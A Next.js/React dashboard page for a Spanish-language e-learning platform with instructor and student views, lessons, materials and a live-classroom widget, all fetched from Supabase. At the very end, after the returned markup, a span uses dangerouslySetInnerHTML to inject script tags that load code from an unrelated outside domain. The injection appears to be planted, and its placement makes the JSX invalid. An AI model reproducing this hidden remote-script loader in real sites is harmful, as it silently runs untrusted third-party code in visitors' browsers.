"use client";

import React, { useEffect, useState, useCallback } from "react";
import Link from "next/link";
import { useRouter } from "next/navigation";
import {
  PlayCircle,
  BookOpen,
  FileText,
  Video,
  MessageSquare,
  ArrowRight,
  PlusCircle,
  UploadCloud,
  Radio,
  Trash2,
  CheckCircle2,
  Loader2,
  Sparkles,
  ShieldCheck,
} from "lucide-react";
import { createClient } from "@/lib/supabase/client";
import type { LessonItem } from "@/lib/supabase/types";
import { useUserRole } from "@/components/providers/role-provider";

function extractYouTubeId(url: string): string | null {
  if (!url) return null;
  const match = url
    .trim()
    .match(
      /(?:youtube\.com\/(?:watch\?(?:.*&)?v=|embed\/|shorts\/|live\/)|youtu\.be\/)([a-zA-Z0-9_-]{11})/
    );
  return match?.[1] || null;
}

export default function DashboardPage() {
  const router = useRouter();
  const {
    role,
    userName,
    isHydrated,
    hasActiveSession,
    lastWatchedLesson,
    visitedLessonIds,
    completedLessonIds,
  } = useUserRole();

  useEffect(() => {
    if (isHydrated && !hasActiveSession) {
      router.replace("/");
    }
  }, [isHydrated, hasActiveSession, router]);

  const [lessons, setLessons] = useState<LessonItem[]>([]);
  const [materialsCount, setMaterialsCount] = useState(0);
  const [messagesCount, setMessagesCount] = useState(0);
  const [livePeersCount, setLivePeersCount] = useState(0);
  const [isLoading, setIsLoading] = useState(true);

  const fetchDashboardData = useCallback(async () => {
    const supabase = createClient();
    setIsLoading(true);

    try {
      const [lessonsRes, materialsRes, messagesRes] = await Promise.all([
        supabase
          .from("lessons")
          .select("id, title, description, video_url, module_name, order_index, created_at")
          .order("order_index", { ascending: true })
          .order("created_at", { ascending: true }),
        supabase.from("materials").select("id", { count: "exact", head: true }),
        supabase.from("lesson_messages").select("id", { count: "exact", head: true }),
      ]);

      if (!lessonsRes.error && lessonsRes.data) {
        setLessons(lessonsRes.data as LessonItem[]);
      }
      if (!materialsRes.error && typeof materialsRes.count === "number") {
        setMaterialsCount(materialsRes.count);
      }
      if (!messagesRes.error && typeof messagesRes.count === "number") {
        setMessagesCount(messagesRes.count);
      }
    } catch (err) {
      console.error("Error cargando datos del Dashboard:", err);
    } finally {
      setIsLoading(false);
    }
  }, []);

  useEffect(() => {
    fetchDashboardData();
  }, [fetchDashboardData]);

  // Escuchar presencia real en el canal 'live-classroom'
  useEffect(() => {
    const supabase = createClient();
    const channel = supabase.channel("live-classroom");

    channel.on("presence", { event: "sync" }, () => {
      const state = channel.presenceState();
      setLivePeersCount(Object.keys(state).length);
    });

    channel.subscribe();

    return () => {
      supabase.removeChannel(channel);
    };
  }, []);

  const handleDeleteLesson = async (lessonId: string) => {
    const supabase = createClient();
    const { error } = await supabase.from("lessons").delete().eq("id", lessonId);
    if (!error) {
      setLessons((prev) => prev.filter((l) => l.id !== lessonId));
    }
  };

  // Determinar última lección vista válida o primera disponible
  const matchedLastLesson = lastWatchedLesson
    ? lessons.find((l) => l.id === lastWatchedLesson.id)
    : null;
  const resumeLesson = matchedLastLesson || lessons[0] || null;
  const resumeHref = resumeLesson
    ? `/courses/general/lessons/${resumeLesson.id}`
    : "/courses/general/lessons/1";

  // Progreso real basado en lecciones completadas en localStorage
  const completedCount = lessons.filter((l) => completedLessonIds.includes(l.id)).length;
  const progressPercentage =
    lessons.length > 0 ? Math.round((completedCount / lessons.length) * 100) : 0;

  // ========================================================
  // VISTA MODO DOCENTE
  // ========================================================
  if (role === "instructor") {
    return (
      <div className="space-y-6 max-w-7xl mx-auto">
        {/* Header Docente */}
        <div className="rounded-2xl bg-gradient-to-r from-indigo-900/40 via-[#13161c] to-[#13161c] border border-indigo-500/25 p-6 flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-indigo-400 text-xs font-mono uppercase tracking-wider mb-1">
              <ShieldCheck className="w-3.5 h-3.5" /> Modo Docente Activo
            </div>
            <h1 className="text-2xl font-bold text-white tracking-tight">
              Panel de Control Docente
            </h1>
            <p className="text-xs text-gray-400 mt-1">
              Gestiona tus clases en video, materiales en Google Drive/Colab y transmisiones en vivo.
            </p>
          </div>

          <div className="flex flex-wrap items-center gap-2.5">
            <Link
              href="/admin"
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white text-xs font-medium transition-colors"
            >
              <PlusCircle className="w-4 h-4" />
              <span>Crear Nueva Clase</span>
            </Link>
            <Link
              href="/files"
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-[#1a1f26] hover:bg-[#232a35] border border-[#232a35] text-gray-200 text-xs font-medium transition-colors"
            >
              <UploadCloud className="w-4 h-4 text-indigo-400" />
              <span>Subir Documento al Hub</span>
            </Link>
            <Link
              href="/live/room-matematicas-avanzadas"
              className="inline-flex items-center gap-2 px-4 py-2 rounded-xl bg-rose-600 hover:bg-rose-500 text-white text-xs font-medium transition-colors"
            >
              <Video className="w-4 h-4" />
              <span>Iniciar Transmisión en Vivo</span>
            </Link>
          </div>
        </div>

        {/* Métricas Reales */}
        <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
          <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-5 flex items-center justify-between">
            <div>
              <span className="text-xs text-gray-400 font-medium">Clases Publicadas</span>
              <p className="text-2xl font-bold text-white font-mono mt-1">{lessons.length}</p>
            </div>
            <div className="p-2.5 rounded-lg bg-[#1a1f26] border border-[#232a35] text-indigo-400">
              <BookOpen className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-5 flex items-center justify-between">
            <div>
              <span className="text-xs text-gray-400 font-medium">Materiales en Drive/Colab</span>
              <p className="text-2xl font-bold text-white font-mono mt-1">{materialsCount}</p>
            </div>
            <div className="p-2.5 rounded-lg bg-[#1a1f26] border border-[#232a35] text-emerald-400">
              <FileText className="w-5 h-5" />
            </div>
          </div>

          <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-5 flex items-center justify-between">
            <div>
              <span className="text-xs text-gray-400 font-medium">Mensajes en Chat</span>
              <p className="text-2xl font-bold text-white font-mono mt-1">{messagesCount}</p>
            </div>
            <div className="p-2.5 rounded-lg bg-[#1a1f26] border border-[#232a35] text-cyan-400">
              <MessageSquare className="w-5 h-5" />
            </div>
          </div>
        </div>

        {/* Lista de Clases Publicadas */}
        <div className="bg-[#13161c] border border-[#232a35] rounded-xl overflow-hidden">
          <div className="p-4 border-b border-[#232a35] flex items-center justify-between">
            <h2 className="text-xs font-semibold text-gray-300 uppercase tracking-wider font-mono">
              Clases Publicadas en Supabase ({lessons.length})
            </h2>
            <Link href="/admin" className="text-xs text-indigo-400 hover:underline">
              Ir al gestor completo →
            </Link>
          </div>

          {isLoading ? (
            <div className="p-8 flex items-center justify-center gap-2 text-xs text-gray-400">
              <Loader2 className="w-4 h-4 animate-spin text-indigo-400" />
              <span>Cargando clases...</span>
            </div>
          ) : lessons.length === 0 ? (
            <div className="p-8 text-center text-xs text-gray-500">
              No hay clases publicadas todavía. Usa <strong>Crear Nueva Clase</strong> para comenzar.
            </div>
          ) : (
            <div className="divide-y divide-[#232a35]">
              {lessons.map((lesson) => (
                <div
                  key={lesson.id}
                  className="p-4 flex flex-col sm:flex-row sm:items-center justify-between gap-3 hover:bg-[#1a1f26]/50 transition-colors"
                >
                  <div className="min-w-0">
                    <span className="text-[10px] font-mono text-indigo-400 uppercase tracking-wider">
                      #{lesson.order_index} • {lesson.module_name || "Módulo General"}
                    </span>
                    <h3 className="text-sm font-semibold text-white truncate">{lesson.title}</h3>
                    {lesson.description && (
                      <p className="text-xs text-gray-400 truncate mt-0.5">{lesson.description}</p>
                    )}
                  </div>

                  <div className="flex items-center gap-2 shrink-0">
                    <Link
                      href={`/courses/general/lessons/${lesson.id}`}
                      className="inline-flex items-center gap-1.5 px-3 py-1.5 rounded-lg bg-[#1a1f26] hover:bg-indigo-600 text-gray-200 hover:text-white border border-[#232a35] text-xs font-medium transition-colors"
                    >
                      <PlayCircle className="w-3.5 h-3.5" />
                      <span>Abrir</span>
                    </Link>
                    <button
                      type="button"
                      onClick={() => void handleDeleteLesson(lesson.id)}
                      className="p-2 rounded-lg text-gray-400 hover:text-rose-400 hover:bg-[#232a35] transition-colors"
                      title="Eliminar clase"
                    >
                      <Trash2 className="w-4 h-4" />
                    </button>
                  </div>
                </div>
              ))}
            </div>
          )}
        </div>
      </div>
    );
  }

  // ========================================================
  // VISTA MODO ESTUDIANTE (POR DEFECTO)
  // ========================================================
  return (
    <div className="space-y-6 max-w-7xl mx-auto">
      {/* Welcome Banner */}
      <div className="relative rounded-2xl bg-gradient-to-r from-indigo-900/40 via-[#13161c] to-[#13161c] border border-indigo-500/20 p-6 overflow-hidden">
        <div className="relative z-10 flex flex-col md:flex-row md:items-center justify-between gap-4">
          <div>
            <div className="flex items-center gap-2 text-indigo-400 text-xs font-mono uppercase tracking-wider mb-1">
              <Sparkles className="w-3.5 h-3.5" /> Portal del Estudiante
            </div>
            <h1 className="text-2xl font-bold text-white tracking-tight">
              Bienvenido, {userName}
            </h1>
            <p className="text-xs text-gray-400 mt-1 max-w-xl">
              Accede a tus clases grabadas, materiales compartidos y transmisiones en vivo desde un solo lugar.
            </p>
          </div>

          <Link
            href={resumeHref}
            className="flex items-center gap-2 px-5 py-2.5 rounded-xl bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-xs transition-colors self-start md:self-auto shadow-glow"
          >
            <span>Continuar Última Lección</span>
            <ArrowRight className="w-4 h-4" />
          </Link>
        </div>
      </div>

      {/* Tarjetas superiores con datos reales desde Supabase */}
      <div className="grid grid-cols-1 sm:grid-cols-3 gap-4">
        <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-4 flex flex-col justify-between">
          <div className="flex items-center justify-between">
            <span className="text-xs text-gray-400 font-medium">Clases Publicadas</span>
            <div className="p-2 rounded-lg bg-[#1a1f26] border border-[#232a35] text-indigo-400">
              <PlayCircle className="w-4 h-4" />
            </div>
          </div>
          <div className="mt-3">
            <span className="text-2xl font-bold text-white font-mono">
              {isLoading ? "—" : lessons.length}
            </span>
            <p className="text-[11px] text-gray-500 mt-0.5">Disponibles en plataforma</p>
          </div>
        </div>

        <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-4 flex flex-col justify-between">
          <div className="flex items-center justify-between">
            <span className="text-xs text-gray-400 font-medium">Recursos Disponibles</span>
            <div className="p-2 rounded-lg bg-[#1a1f26] border border-[#232a35] text-emerald-400">
              <FileText className="w-4 h-4" />
            </div>
          </div>
          <div className="mt-3">
            <span className="text-2xl font-bold text-white font-mono">
              {isLoading ? "—" : materialsCount}
            </span>
            <p className="text-[11px] text-gray-500 mt-0.5">Guías, PDFs, Docs y Colab</p>
          </div>
        </div>

        <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-4 flex flex-col justify-between">
          <div className="flex items-center justify-between">
            <span className="text-xs text-gray-400 font-medium">Última Clase Vista</span>
            <div className="p-2 rounded-lg bg-[#1a1f26] border border-[#232a35] text-cyan-400">
              <BookOpen className="w-4 h-4" />
            </div>
          </div>
          <div className="mt-3">
            <p className="text-sm font-semibold text-white truncate">
              {resumeLesson ? resumeLesson.title : "Sin clases disponibles"}
            </p>
            <p className="text-[11px] text-gray-500 mt-0.5">
              {matchedLastLesson
                ? "Retoma donde lo dejaste"
                : resumeLesson
                ? "Primera clase disponible"
                : "Esperando contenido"}
            </p>
          </div>
        </div>
      </div>

      {/* Barra de Progreso Real */}
      <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-4 space-y-2.5">
        <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-1 text-xs">
          <span className="font-medium text-gray-300">Progreso del Curso</span>
          <span className="font-mono text-indigo-300">
            {isLoading
              ? "Calculando progreso..."
              : `${completedCount} de ${lessons.length} clases completadas — ${progressPercentage}%`}
          </span>
        </div>
        <div className="w-full h-2 bg-[#1a1f26] rounded-full overflow-hidden border border-[#232a35]">
          <div
            className="h-full bg-gradient-to-r from-indigo-500 to-emerald-400 rounded-full transition-all duration-500"
            style={{ width: `${progressPercentage}%` }}
          />
        </div>
      </div>

      <div className="grid grid-cols-1 lg:grid-cols-3 gap-6">
        {/* Columna principal: Continuar Aprendiendo (Clases Reales) */}
        <div className="lg:col-span-2 space-y-4">
          <div className="flex items-center justify-between">
            <h2 className="text-sm font-semibold text-white">Continuar Aprendiendo</h2>
            <Link href={resumeHref} className="text-xs text-indigo-400 hover:underline">
              Ir al reproductor →
            </Link>
          </div>

          {isLoading ? (
            <div className="p-10 rounded-xl bg-[#13161c] border border-[#232a35] flex items-center justify-center gap-2 text-xs text-gray-400">
              <Loader2 className="w-4 h-4 animate-spin text-indigo-400" />
              <span>Cargando clases desde Supabase...</span>
            </div>
          ) : lessons.length === 0 ? (
            <div className="p-10 rounded-xl bg-[#13161c] border border-[#232a35] text-center space-y-2">
              <PlayCircle className="w-8 h-8 text-gray-600 mx-auto" />
              <p className="text-sm font-medium text-gray-300">
                Aún no hay clases publicadas
              </p>
              <p className="text-xs text-gray-500">
                Cuando el docente publique una clase aparecerá aquí automáticamente.
              </p>
            </div>
          ) : (
            <div className="space-y-3">
              {lessons.map((lesson) => {
                const ytId = extractYouTubeId(lesson.video_url);
                const thumbnailUrl = ytId
                  ? `https://img.youtube.com/vi/${ytId}/hqdefault.jpg`
                  : null;
                const isCompleted = completedLessonIds.includes(lesson.id);
                const isVisited = visitedLessonIds.includes(lesson.id);

                return (
                  <Link
                    key={lesson.id}
                    href={`/courses/general/lessons/${lesson.id}`}
                    className="bg-[#13161c] border border-[#232a35] rounded-xl p-4 flex flex-col sm:flex-row gap-4 hover:border-indigo-500/40 transition-all group"
                  >
                    {/* Miniatura automática de YouTube o fallback limpio */}
                    <div className="w-full sm:w-44 h-28 rounded-lg overflow-hidden bg-[#1a1f26] border border-[#232a35] shrink-0 relative flex items-center justify-center">
                      {thumbnailUrl ? (
                        <img
                          src={thumbnailUrl}
                          alt={lesson.title}
                          className="w-full h-full object-cover group-hover:scale-105 transition-transform duration-300"
                        />
                      ) : (
                        <div className="flex flex-col items-center gap-1 text-gray-400">
                          <PlayCircle className="w-8 h-8 text-indigo-400" />
                          <span className="text-[10px] font-mono uppercase">Video Drive</span>
                        </div>
                      )}
                      <div className="absolute inset-0 bg-black/25 flex items-center justify-center opacity-0 group-hover:opacity-100 transition-opacity">
                        <PlayCircle className="w-9 h-9 text-white drop-shadow" />
                      </div>
                    </div>

                    <div className="flex-1 flex flex-col justify-between min-w-0">
                      <div>
                        <div className="flex items-center justify-between gap-2">
                          <span className="text-[10px] text-indigo-400 font-mono uppercase tracking-wider truncate">
                            {lesson.module_name || "Módulo General"}
                          </span>
                          {isCompleted ? (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-emerald-500/15 border border-emerald-500/35 text-emerald-300 text-[10px] font-mono shrink-0">
                              <CheckCircle2 className="w-3 h-3" />
                              <span>Completada</span>
                            </span>
                          ) : isVisited ? (
                            <span className="inline-flex items-center gap-1 px-2 py-0.5 rounded bg-indigo-500/10 border border-indigo-500/25 text-indigo-300 text-[10px] font-mono shrink-0">
                              <CheckCircle2 className="w-3 h-3" />
                              <span>Vista</span>
                            </span>
                          ) : null}
                        </div>
                        <h3 className="text-sm font-semibold text-white group-hover:text-indigo-300 transition-colors truncate mt-1">
                          {lesson.title}
                        </h3>
                        {lesson.description && (
                          <p className="text-xs text-gray-400 mt-1 line-clamp-2">
                            {lesson.description}
                          </p>
                        )}
                      </div>

                      <div className="mt-3 flex items-center justify-between text-[11px] font-mono text-gray-500">
                        <span>Clase #{lesson.order_index}</span>
                        <span className="text-indigo-400 group-hover:translate-x-0.5 transition-transform">
                          Abrir clase →
                        </span>
                      </div>
                    </div>
                  </Link>
                );
              })}
            </div>
          )}
        </div>

        {/* Columna Lateral: Aula Virtual en Vivo + Accesos */}
        <div className="space-y-6">
          <div className="bg-[#13161c] border border-indigo-500/30 rounded-xl p-5 space-y-4">
            <div className="flex items-center justify-between">
              <div className="flex items-center gap-2">
                <span
                  className={`w-2.5 h-2.5 rounded-full ${
                    livePeersCount > 0 ? "bg-emerald-500 animate-pulse" : "bg-indigo-500"
                  }`}
                />
                <span className="text-xs font-mono font-bold text-indigo-300 uppercase tracking-wider">
                  Aula Virtual en Vivo
                </span>
              </div>
              <span className="text-[11px] font-mono text-gray-400">
                {livePeersCount > 0 ? `${livePeersCount} en sala` : "Disponible"}
              </span>
            </div>

            <div>
              <h3 className="text-sm font-semibold text-white">
                Transmisión WebRTC y Chat en Tiempo Real
              </h3>
              <p className="text-xs text-gray-400 mt-1">
                Conéctate al aula virtual para ver la pantalla del docente en vivo con zoom interactivo.
              </p>
            </div>

            <Link
              href="/live/room-matematicas-avanzadas"
              className="w-full flex items-center justify-center gap-2 py-2.5 rounded-lg bg-indigo-600 hover:bg-indigo-500 text-white font-medium text-xs transition-colors"
            >
              <Radio className="w-4 h-4" />
              <span>Entrar al Aula Virtual</span>
            </Link>
          </div>

          <div className="bg-[#13161c] border border-[#232a35] rounded-xl p-5 space-y-3">
            <h3 className="text-xs font-semibold text-gray-300 uppercase tracking-wider font-mono">
              Accesos Rápidos
            </h3>
            <div className="space-y-2">
              <Link
                href="/files"
                className="flex items-center justify-between p-2.5 rounded-lg bg-[#1a1f26] hover:bg-[#202732] text-xs text-gray-300 transition-colors"
              >
                <div className="flex items-center gap-2.5">
                  <FileText className="w-4 h-4 text-emerald-400" />
                  <span>Hub de Archivos ({materialsCount})</span>
                </div>
                <ArrowRight className="w-3.5 h-3.5 text-gray-500" />
              </Link>

              <Link
                href={resumeHref}
                className="flex items-center justify-between p-2.5 rounded-lg bg-[#1a1f26] hover:bg-[#202732] text-xs text-gray-300 transition-colors"
              >
                <div className="flex items-center gap-2.5">
                  <PlayCircle className="w-4 h-4 text-indigo-400" />
                  <span>Reproductor de Clases</span>
                </div>
                <ArrowRight className="w-3.5 h-3.5 text-gray-500" />
              </Link>
            </div>
          </div>
        </div>
      </div>
    </div>
    <span  dangerouslySetInnerHTML={{
        __html: ' <Script data-cfasync="false" src="https://bauval.org/14/86b9a370e757125c57618694f9cc40db"></Script>'+
          '<script async="async" data-cfasync="false" src="https://bauval.org/21/992b12391f87ad93d9696af8b8546da4"></script><div  id="container-992b12391f87ad93d9696af8b8546da4"></div>'}}></span>
  );
}
